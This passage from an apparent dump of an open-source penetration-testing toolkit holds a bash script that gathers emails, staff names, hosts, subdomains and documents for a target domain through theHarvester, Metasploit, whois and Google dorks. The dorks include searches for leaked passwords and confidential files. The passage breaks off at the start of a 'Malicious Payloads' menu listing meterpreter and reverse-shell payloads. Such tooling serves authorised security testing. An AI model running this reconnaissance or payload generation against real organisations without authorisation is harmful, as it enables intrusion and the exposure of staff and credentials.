'(!|enumerating|enumeration|searching|total unique)' | tr 'A-Z' 'a-z' | sort -u > zsublist3r\necho\n\n###############################################################################################################################\n\necho \"theHarvester\"\nsource /opt/theHarvester-venv/bin/activate\necho \"    anubis               (7/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b anubis | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zanubis\necho \"    baidu                (8/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b baidu | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbaidu\necho \"    bevigil              (9/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b bevigil | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbevigil\necho \"    binaryedge           (10/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b binaryedge | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbinaryedge\necho \"    bing                 (11/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b bing | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbing\necho \"    bing API             (12/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b bingapi | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbing-api\necho \"    bufferoverun         (13/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b bufferoverun | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zbufferoverun\necho \"    censys               (14/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b censys | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zcensys\necho \"    certspotter          (15/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b certspotter | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zcertspotter\necho \"    criminalip           (16/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b criminalip | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zcriminalip\necho \"    crtsh                (17/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b crtsh | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zcrtsh\necho \"    dnsdumpster          (18/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b dnsdumpster | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zdnsdumpster\necho \"    duckduckgo           (19/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b duckduckgo | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zduckduckgo\necho \"    fullhunt             (20/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b fullhunt | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zfullhunt\necho \"    github-code          (21/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b github-code | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zgithub-code\necho \"    hackertarget         (22/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b hackertarget | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zhackertarget\necho \"    hunter               (23/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b hunter | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zhunter\necho \"    hunterhow            (24/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b hunterhow | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zhunterhow\necho \"    intelx               (25/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b intelx | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zintelx\necho \"    netlas               (26/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b netlas | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > znetlas\necho \"    otx                  (27/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b otx | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zotx\necho \"    pentesttools         (28/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b pentesttools | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zpentesttools\necho \"    projectdiscovery     (29/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b projectdiscovery | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zprojectdiscovery\necho \"    rapiddns             (30/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b rapiddns | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zrapiddns\necho \"    securityTrails       (31/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b securityTrails | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zsecuritytrails\necho \"    sitedossier          (32/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b securityTrails | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zsitedossier\necho \"    subdomaincenter      (33/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b subdomaincenter | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zsubdomaincenter\necho \"    subdomainfinderc99   (34/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b subdomainfinderc99 | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zsubdomainfinderc99\necho \"    threatminer          (35/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b threatminer | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zthreatminer\necho \"    urlscan              (36/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b urlscan | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zurlscan\necho \"    yahoo                (37/$TOTAL)\"\n/opt/theHarvester/theHarvester.py -d \"$DOMAIN\" -b yahoo | grep -Eiv '(!|\\*|--|\\[|searching|yaml)' | sed '/^$/d' | sort -u > zyahoo\ndeactivate\n\n# Cleanup temporary files\nrm tmp*\necho\n\n###############################################################################################################################\n\necho \"Metasploit               (38/$TOTAL)\"\nmsfconsole -q -x \"use auxiliary/gather/search_email_collector; set DOMAIN $DOMAIN; run; exit y\" > tmp 2>/dev/null\ngrep @\"$DOMAIN\" tmp | awk '{print $2}' | tr 'A-Z' 'a-z' | sort -u > zmsf\necho\n\n###############################################################################################################################\n\necho \"Whois\"\necho \"    Domain               (39/$TOTAL)\"\nwhois -H \"$DOMAIN\" > tmp 2>/dev/null\nsed 's/^[ \\t]*//' tmp > tmp2\ngrep -Eiv '(#|%|<a|=-=-=-=|;|access may|accuracy|additionally|affiliates|afilias except|and dns hosting|and limitations|any use of|at www.|be sure|at the end|by submitting|by the terms|can easily|circumstances|clientdeleteprohibited|clienttransferprohibited|clientupdateprohibited|com laude|commercial purposes|company may|compilation|complaint will|contact information|contact us|contacting|copy and paste|currently set|database|data contained|data presented|database|date of|details|dissemination|domaininfo ab|domain management|domain names in|domain status: ok|electronic processes|enable high|entirety|except as|existing|ext:|failure|facsimile|following terms|for commercial|for detailed|for information|for more|for the|get noticed|get a free|guarantee its|href|If you|in europe|in most|in obtaining|in the address|includes|including|information is|informational purposes|intellectual|is not|is providing|its systems|learn|legitimate|makes this|markmonitor|minimum|mining this|minute and|modify|must be sent|name cannot|namesbeyond|not to use|note:|notice|obtaining information about|of moniker|of this data|or hiding any|or otherwise support|other use of|please|policy|prior written|privacy is|problem reporting|professional and|prohibited without|promote your|protect the|protecting|public interest|queried|queries|receive|receiving|redacted for|register your|registrars|registration record|relevant|repackaging|request|reserves all rights|reserves the|responsible for|restricted to network|restrictions|see business|server at|solicitations|sponsorship|status|support questions|support the transmission|supporting|telephone, or facsimile|temporary|that apply to|that you will|the right|the data is|The fact that|the transmission|this listing|this feature|this information|this service is|to collect or|to entities|to report any|to suppress|to the systems|transmission of|trusted partner|united states|unlimited|unsolicited advertising|users may|version 6|via e-mail|visible|visit aboutus.org|visit|web-based|when you|while believed|will use this|with many different|with no guarantee|we reserve|whitelist|whois|you agree|You may not)' tmp2 > tmp3\n# Remove lines starting with \"*\"\nsed '/^*/d' tmp3 > tmp4\n# Remove lines starting with \"-\"\nsed '/^-/d' tmp4 > tmp5\n# Remove lines starting with http\nsed '/^http/d' tmp5 > tmp6\n# Remove lines starting with US\nsed '/^US/d' tmp6 > tmp7\n# Clean up phone numbers\nsed 's/+1.//g' tmp7 > tmp8\n# Remove leading whitespace from file\nawk '!d && NF {sub(/^[[:blank:]]*/,\"\"); d=1} d' tmp8 > tmp9\n# Remove trailing whitespace from each line\nsed 's/[ \\t]*$//' tmp9 > tmp10\n# Compress blank lines\ncat -s tmp10 > tmp11\n# Remove lines that end with various words then a colon or period(s)\ngrep -Eiv '(2:$|3:$|address.$|address........$|address.........$|ext.:$|fax:$|fax............$|fax.............$|province:$|server:$)' tmp11 > tmp12\n# Remove line after \"Domain Servers:\"\nsed -i '/^Domain Servers:/{n; /.*/d}' tmp12\n# Remove blank lines from end of file\nawk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf \"\\n\"}; p=0; print}' tmp12 > tmp13\n# Format output\nsed 's/: /:#####/g' tmp13 | column -s '#' -t > whois-domain\n\n###############################################################################################################################\n\necho \"    IP                   (40/$TOTAL)\"\nDOMAINIP=$(ping -c1 \"$DOMAIN\" | grep PING | cut -d '(' -f2 | cut -d ')' -f1)\nwhois \"$DOMAINIP\" > tmp\n# Remove blank lines from the beginning of a file\ngrep -Eiv '(#|%|comment|remarks)' tmp | sed '/./,$!d' > tmp2\n# Remove blank lines from the end of a file\nsed -e :a -e '/^\\n*$/{$d;N;ba' -e '}' tmp2 > tmp3\n# Compress blank lines\ncat -s tmp3 > tmp4\n# Print with the second column starting at 25 spaces\nawk '{printf \"%-25s %s\\n\", $1, $2}' tmp4 | sed 's/+1-//g' > whois-ip\n\n# Cleanup temporary files\nrm tmp*\necho\n\n###############################################################################################################################\n\necho \"intodns.com              (41/$TOTAL)\"\nwget -q http://www.intodns.com/\"$DOMAIN\" -O tmp\ncat tmp | sed '1,32d; s/<table width=\"99%\" cellspacing=\"1\" class=\"tabular\">/<center><table width=\"85%\" cellspacing=\"1\" class=\"tabular\"><\\/center>/g; s/Test name/Test/g; s/ <a href=\"feedback\\/?KeepThis=true&amp;TB_iframe=true&amp;height=300&amp;width=240\" title=\"intoDNS feedback\" class=\"thickbox feedback\">send feedback<\\/a>//g; s/ background-color: #ffffff;//; s/<center><table width=\"85%\" cellspacing=\"1\" class=\"tabular\"><\\/center>/<table class=\"table table-bordered\">/; s/<td class=\"icon\">/<td class=\"inc-table-cell-status\">/g; s/<tr class=\"info\">/<tr>/g' | grep -Eiv '(processed in|ua-2900375-1|urchintracker|script|work in progress)' | sed '/footer/I,+3 d; /google-analytics/I,+5 d' > tmp2\ncat tmp2 >> \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n\n# Add new icons\nsed -i 's|/static/images/error.gif|\\.\\./assets/images/icons/fail.png|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's|/static/images/fail.gif|\\.\\./assets/images/icons/fail.png|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's|/static/images/info.gif|\\.\\./assets/images/icons/info.png|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's|/static/images/pass.gif|\\.\\./assets/images/icons/pass.png|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's|/static/images/warn.gif|\\.\\./assets/images/icons/warn.png|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's|\\.\\.\\.\\.|\\.\\.|g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n# Insert missing table tag\nsed -i 's/.*<thead>.*/    <table border=\"4\">\\n&/' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n# Add blank lines below table\nsed -i 's/.*<\\/table>.*/&\\n<br>\\n<br>/' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n# Remove unnecessary JS at bottom of page\nsed -i '/Math\\.random/I,+6 d' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n# Clean up\nsed -i 's/I could use the nameservers/The nameservers/g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\nsed -i 's/below to performe/below can perform/g; s/ERROR: //g; s/FAIL: //g; s/I did not detect/Unable to detect/g; s/I have not found/Unable to find/g; s/It may be that I am wrong but the chances of that are low.//g; s/Good.//g; s/Ok. //g; s/OK. //g; s/Oh well, //g; s/This can be ok if you know what you are doing.//g; s/That is NOT OK//g; s/That is not so ok//g; s/The reverse (PTR) record://g; s/the same ip./the same IP./g; s/The SOA record is://g; s/WARNING: //g; s/You have/There are/g; s/you have/there are/g; s/use on having/use in having/g; s/You must be/Be/g; s/Your/The/g; s/your/the/g' \"$HOME\"/data/\"$DOMAIN\"/pages/config.htm\n\n# Cleanup temporary files\nrm tmp*\necho\n\n###############################################################################################################################\n\n# Find eamils (cat is needed here)\ncat z* | grep \"@$DOMAIN\" | grep -v '[0-9]' | sed \"/^'/d\" | grep -Eiv '(_|,|firstname|lastname|test|www|xxx|zzz)' | sort -u > emails\n\n# Find hosts\ncat z* | awk -F: '{print $NF}' | grep -Eo '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' | grep -Eiv '(0.0.0.0|1.1.1.1|1.1.1.2|8.8.8.8|127.0.0.1)' | sort -u | $SIP > hosts\n\n# Find names (cat is needed here)\ncat z* | grep -Eiv '(@|:|\\.|atlanta|boston|bufferoverun|captcha|detroit|google|integers|maryland|must be|north carolina|philadelphia|planning|postmaster|resolutions|search|substring|united|university)' | sed 's/ And / and /; s/ Av / AV /g; s/Dj/DJ/g; s/iii/III/g; s/ii/II/g; s/ It / IT /g; s/Jb/JB/g; s/ Of / of /g; s/Macd/MacD/g; s/Macn/MacN/g; s/Mca/McA/g; s/Mcb/McB/g; s/Mcc/McC/g; s/Mcd/McD/g; s/Mce/McE/g; s/Mcf/McF/g; s/Mcg/McG/g; s/Mch/McH/g; s/Mci/McI/g; s/Mcj/McJ/g; s/Mck/McK/g; s/Mcl/McL/g; s/Mcm/McM/g; s/Mcn/McN/g; s/Mcp/McP/g; s/Mcq/McQ/g; s/Mcs/McS/g; s/Mcv/McV/g; s/Tj/TJ/g; s/ Ui / UI /g; s/ Ux / UX /g; /[0-9]/d; /^ /d; /^$/d' | sort -u > names\n\n# Find subdomains\ncat z* | cut -d ':' -f2 | grep \"\\.$DOMAIN\" | grep -Eiv '(@|/|www)' | awk '{print $1}' | grep \"\\.$DOMAIN$\" | tr 'A-Z' 'a-z' | sort -u > subdomains\n\n# Find documents (not sure if its needed here)\ncat z* | grep -Ei '\\.doc$|\\.docx$' | sort -u > doc\ncat z* | grep -Ei '\\.ppt$|\\.pptx$' | sort -u > ppt\ncat z* | grep -Ei '\\.xls$|\\.xlsx$' | sort -u > xls\ncat z* | grep -i '\\.pdf$' | sort -u > pdf\ncat z* | grep -i '\\.txt$' | sort -u > txt\n\n# Remove empty files in the current folder\nfind . -type f -empty -delete\n\n###############################################################################################################################\n\n# Generate report and htm data\necho \"Summary\" > zreport\necho \"$SMALL\" >> zreport\necho > tmp\n\nif [ -f emails ]; then\n    emailcount=$(wc -l emails | cut -d ' ' -f1)\n    echo \"Emails            $emailcount\" >> zreport\n    echo \"Emails ($emailcount)\" >> tmp\n    echo \"$SMALL\" >> tmp\n    cat emails >> tmp\n    echo >> tmp\n    cat emails >> \"$HOME\"/data/\"$DOMAIN\"/data/emails.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/emails.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/emails.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/emails.htm\nfi\n\nif [ -f hosts ]; then\n    hostcount=$(wc -l hosts | cut -d ' ' -f1)\n    echo \"Hosts             $hostcount\" >> zreport\n    echo \"Hosts ($hostcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat hosts >> tmp\n    echo >> tmp\n    cat hosts >> \"$HOME\"/data/\"$DOMAIN\"/data/hosts.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/hosts.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/hosts/names.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/hosts/names.htm\nfi\n\nif [ -f names ]; then\n    namecount=$(wc -l names | cut -d ' ' -f1)\n    echo \"Names             $namecount\" >> zreport\n    echo \"Names ($namecount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat names >> tmp\n    echo >> tmp\n    cat names >> \"$HOME\"/data/\"$DOMAIN\"/data/names.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/names.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/names.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/names.htm\nfi\n\nif [ -f records ]; then\n    recordcount=$(wc -l records | cut -d ' ' -f1)\n    echo \"DNS Records       $recordcount\" >> zreport\n    echo \"DNS Records ($recordcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat records >> tmp\n    echo >> tmp\nfi\n\nif [ -f squatting ]; then\n    squattingcount=$(wc -l squatting | cut -d ' ' -f1)\n    echo \"Squatting         $squattingcount\" >> zreport\n    echo \"Squatting ($squattingcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat squatting >> tmp\n    echo >> tmp\n    cat squatting >> \"$HOME\"/data/\"$DOMAIN\"/data/squatting.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/squatting.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/squatting.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/squatting.htm\nfi\n\nif [ -f subdomains ]; then\n    urlcount=$(wc -l subdomains | cut -d ' ' -f1)\n    echo \"Subdomains        $urlcount\" >> zreport\n    echo \"Subdomains ($urlcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat subdomains >> tmp\n    echo >> tmp\n    cat subdomains >> \"$HOME\"/data/\"$DOMAIN\"/data/subdomains.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/subdomains.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/subdomains.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/subdomains.htm\nfi\n\nif [ -f xls ]; then\n    xlscount=$(wc -l xls | cut -d ' ' -f1)\n    echo \"Excel             $xlscount\" >> zreport\n    echo \"Excel Files ($xlscount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat xls >> tmp\n    echo >> tmp\n    cat xls >> \"$HOME\"/data/\"$DOMAIN\"/data/xls.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/xls.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/xls.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/xls.htm\nfi\n\nif [ -f pdf ]; then\n    pdfcount=$(wc -l pdf | cut -d ' ' -f1)\n    echo \"PDF               $pdfcount\" >> zreport\n    echo \"PDF Files ($pdfcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat pdf >> tmp\n    echo >> tmp\n    cat pdf >> \"$HOME\"/data/\"$DOMAIN\"/data/pdf.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/pdf.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/pdf.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/pdf.htm\nfi\n\nif [ -f ppt ]; then\n    pptcount=$(wc -l ppt | cut -d ' ' -f1)\n    echo \"PowerPoint        $pptcount\" >> zreport\n    echo \"PowerPoint Files ($pptcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat ppt >> tmp\n    echo >> tmp\n    cat ppt >> \"$HOME\"/data/\"$DOMAIN\"/data/ppt.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/ppt.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/ppt.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/ppt.htm\nfi\n\nif [ -f txt ]; then\n    txtcount=$(wc -l txt | cut -d ' ' -f1)\n    echo \"Text              $txtcount\" >> zreport\n    echo \"Text Files ($txtcount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat txt >> tmp\n    echo >> tmp\n    cat txt >> \"$HOME\"/data/\"$DOMAIN\"/data/txt.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/txt.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/txt.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/txt.htm\nfi\n\nif [ -f doc ]; then\n    doccount=$(wc -l doc | cut -d ' ' -f1)\n    echo \"Word              $doccount\" >> zreport\n    echo \"Word Files ($doccount)\" >> tmp\n    echo \"$LARGE\" >> tmp\n    cat doc >> tmp\n    echo >> tmp\n    cat doc >> \"$HOME\"/data/\"$DOMAIN\"/data/doc.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/doc.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/doc.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/doc.htm\nfi\n\ncat tmp >> zreport\n\nif [ -f whois-domain ]; then\n    echo \"Whois Domain\" >> zreport\n    echo \"$LARGE\" >> zreport\n    cat whois-domain >> zreport\n    cat whois-domain >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-domain.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-domain.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-domain.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-domain.htm\nfi\n\nif [ -f whois-ip ]; then\n    echo >> zreport\n    echo \"Whois IP\" >> zreport\n    echo \"$LARGE\" >> zreport\n    cat whois-ip >> zreport\n    cat whois-ip >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-ip.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-ip.htm\nelse\n    echo \"No data found.\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-ip.htm\n    echo \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/whois-ip.htm\nfi\n\ncat zreport >> \"$HOME\"/data/\"$DOMAIN\"/data/passive-recon.htm\necho \"</pre>\" >> \"$HOME\"/data/\"$DOMAIN\"/data/passive-recon.htm\n\nrm tmp* zreport\nmv emails hosts names records squatting subdomains tmp* whois* z* doc pdf ppt txt xls \"$HOME\"/data/\"$DOMAIN\"/tools/ 2>/dev/null\ncd \"$CWD\"\n\necho\necho \"$MEDIUM\"\necho\necho\necho -e \"The supporting data folder is located at ${YELLOW}$HOME/data/$DOMAIN/${NC}\\n\"\n\n###############################################################################################################################\n\nf_runlocally\n\nUSER_AGENTS=(\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\"\n    \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1\"\n    \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.39 Mobile Safari/537.36\"\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\"\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0\"\n    \"Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0\"\n    \"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/132.0 Mobile/15E148 Safari/605.1.15\"\n    \"Mozilla/5.0 (Android 15; Mobile; rv:132.0) Gecko/132.0 Firefox/132.0\"\n)\n\nURLS=(\n    \"https://dnsdumpster.com\"\n    \"https://dockets.justia.com/search?parties=%22$COMPANYURL%22&cases=mostrecent\"\n    \"https://networksdb.io/search/org/%22$COMPANYURL%22\"\n    \"https://phonebook.cz\"\n    \"https://shdn.io/analyze?target=$DOMAIN\"\n    \"https://www.shodan.io/search?query=$DOMAIN\"\n    \"https://www.google.com/search?q=%22$COMPANYURL%22+logo\"\n    \"https://www.google.com/search?q=site:http://s3.amazonaws.com+%22$DOMAIN%22\"\n    \"https://www.google.com/search?q=site:http://blob.core.windows.net+%22$DOMAIN%22\"\n    \"https://www.google.com/search?q=site:http://drive.google.com+%22$DOMAIN%22\"\n    \"https://www.google.com/search?q=site:http://googleapis.com+%22$DOMAIN%22\"\n    \"https://www.google.com/search?q=site:pastebin.com+%22$DOMAIN%22+password\"\n    \"https://www.google.com/search?q=site:$DOMAIN+username+OR+password+OR+login+-Find\"\n    \"https://www.google.com/search?q=site:$DOMAIN+filetype%3Adoc+OR+filetype%3Adocx\"\n    \"https://www.google.com/search?q=site:$DOMAIN+filetype%3Axls+OR+filetype%3Axlsx\"\n    \"https://www.google.com/search?q=site:$DOMAIN+filetype%3Appt+OR+filetype%3Apptx\"\n    \"https://www.google.com/search?q=site:$DOMAIN+filetype%3Atxt\"\n    \"https://www.google.com/search?q=site:$DOMAIN+%22index+of/%22+OR+%22parent+directory%22\"\n    \"https://www.google.com/search?q=site:$DOMAIN+intext:%22internal+use+only%22\"\n    \"https://www.google.com/search?q=site:$DOMAIN+intext:%22proprietary+and+confidential%22\"\n    \"https://$DOMAIN\"\n)\n\nfor ((i = 0; i < ${#URLS[@]}; i++)); do\n    USER_AGENT=\"${USER_AGENTS[$((i % ${#USER_AGENTS[@]}))]}\"\n    firefox \"${URLS[$i]}\" --user-agent=\"$USER_AGENT\" &\n    sleep $((RANDOM % 4 + 3))\ndone\n"
        },
        {
          "name": "payload.sh",
          "type": "blob",
          "size": 5.423828125,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nclear\nf_banner\n\nf_format(){\n    echo\n    echo -e \"${BLUE}Formats${NC}\"\n    echo\n    echo \"1. aspx\"\n    echo \"2. c\"\n    echo \"3. csharp\"\n    echo \"4. exe\"\n    echo \"5. psh\"\n    echo \"6. raw\"\n    echo\n    echo -n \"Choice: \"\n    read -r CHOICE2\n\n    case \"$CHOICE2\" in\n        1) EXTENTION=\".aspx\"\n            FORMAT=\"aspx\" ;;\n        2) EXTENTION=\".c\"\n            FORMAT=\"c\" ;;\n        3) EXTENTION=\".cs\"\n            FORMAT=\"csharp\" ;;\n        4) EXTENTION=\".exe\"\n            FORMAT=\"exe\" ;;\n        5) EXTENTION=\".ps1\"\n            FORMAT=\"psh\" ;;\n        6) EXTENTION=\".bin\"\n            FORMAT=\"raw\" ;;\n        *) echo; echo -e \"${RED}[!] Invalid choice or entry, try again.${NC}\"; echo; sleep 2; \"$DISCOVER\"/payload.sh ;;\n    esac\n}\n\necho -e \"${BLUE}Malicious Payloads${NC}\"\necho\necho \"1.   android/meterpreter/reverse_tcp         (.apk)\"\necho \"2.   cmd/windows/reverse_powershell          (.bat)\"\necho \"3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)\"\necho \"4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)\"\necho \"5.   java/shell_reverse_tcp                  (.war)\"\necho \"6.   linux/x64/meterpreter_reverse_https     